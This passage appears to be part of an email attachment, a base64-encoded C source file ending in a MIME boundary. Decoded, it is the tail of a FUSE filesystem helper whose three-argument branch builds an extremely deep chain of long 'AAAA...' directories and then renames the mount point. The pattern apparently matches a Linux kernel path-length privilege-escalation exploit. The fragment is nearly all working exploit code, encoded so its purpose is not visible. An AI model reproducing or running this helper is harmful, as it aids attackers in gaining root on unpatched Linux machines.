c2l6ZV90IGxlbjsNCiAgICAodm9pZCkgZmk7DQogICAgaWYgKHN0cmNtcChw
YXRoLCBoZWxsb19wYXRoKSAhPSAwKQ0KICAgICAgICByZXR1cm4gLUVOT0VO
VDsNCg0KICAgIGxlbiA9IHN0cmxlbihoZWxsb19zdHIpOw0KICAgIGlmIChv
ZmZzZXQgPCBsZW4pIHsNCiAgICAgICAgaWYgKG9mZnNldCArIHNpemUgPiBs
ZW4pDQogICAgICAgICAgICBzaXplID0gbGVuIC0gb2Zmc2V0Ow0KICAgICAg
ICBtZW1jcHkoYnVmLCBoZWxsb19zdHIgKyBvZmZzZXQsIHNpemUpOw0KICAg
IH0gZWxzZQ0KICAgICAgICBzaXplID0gMDsNCg0KICAgIHJldHVybiBzaXpl
Ow0KfQ0KDQpzdGF0aWMgc3RydWN0IGZ1c2Vfb3BlcmF0aW9ucyBoZWxsb19v
cGVyID0gew0KICAgIC5nZXRhdHRyID0gaGVsbG9fZ2V0YXR0ciwNCiAgICAu
cmVhZGRpciA9IGhlbGxvX3JlYWRkaXIsDQogICAgLm9wZW4gICAgPSBoZWxs
b19vcGVuLA0KICAgIC5yZWFkICAgID0gaGVsbG9fcmVhZCwNCn07DQoNCmlu
dCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogICAgaWYgKGFy
Z2MgIT0gMikgew0KICAgICAgICBpZiAoYXJnYyAhPSAzKSBleGl0KF9fTElO
RV9fKTsNCiAgICAgICAgY2hhciAqIGNvbnN0IG1wb2ludCA9IGFyZ3ZbMV07
DQogICAgICAgIGlmIChjaGRpcihhcmd2WzJdKSkgZXhpdChfX0xJTkVfXyk7
DQoNCiAgICAgICAgc3RhdGljIGNoYXIgb25lZGlyW05BTUVfTUFYICsgMV07
DQogICAgICAgIG1lbXNldChvbmVkaXIsICdBJywgc2l6ZW9mKG9uZWRpcikt
MSk7DQoNCiAgICAgICAgc2l6ZV90IGk7DQogICAgICAgIHB1dHMoImNyZWF0
aW5nIGRpcmVjdG9yaWVzLCBwbGVhc2Ugd2FpdC4uLiIpOw0KICAgICAgICBm
b3IgKGkgPSAwOyBpIDw9ICgxIDw8IDIzKSAvIHNpemVvZihvbmVkaXIpOyBp
KyspIHsNCiAgICAgICAgICAgIGlmIChta2RpcihvbmVkaXIsIFNfSVJXWFUp
KSBleGl0KF9fTElORV9fKTsNCiAgICAgICAgICAgIGlmIChjaGRpcihvbmVk
aXIpKSBleGl0KF9fTElORV9fKTsNCiAgICAgICAgfQ0KDQogICAgICAgIGNo
YXIgKiBjb25zdCByc2xhc2ggPSBzdHJyY2hyKG1wb2ludCwgJy8nKTsNCiAg
ICAgICAgaWYgKCFyc2xhc2gpIGV4aXQoX19MSU5FX18pOw0KICAgICAgICAq
cnNsYXNoID0gJ1wwJzsNCg0KICAgICAgICBpZiAocmVuYW1lKG1wb2ludCwg
Ii4vQSIpKSBleGl0KF9fTElORV9fKTsNCiAgICAgICAgZXhpdChFWElUX1NV
Q0NFU1MpOw0KICAgIH0NCg0KICAgIHJldHVybiBmdXNlX21haW4oYXJnYywg
YXJndiwgJmhlbGxvX29wZXIsIE5VTEwpOw0KfQ0K

--_002_20210720123712GB19170localhostlocaldomain_--
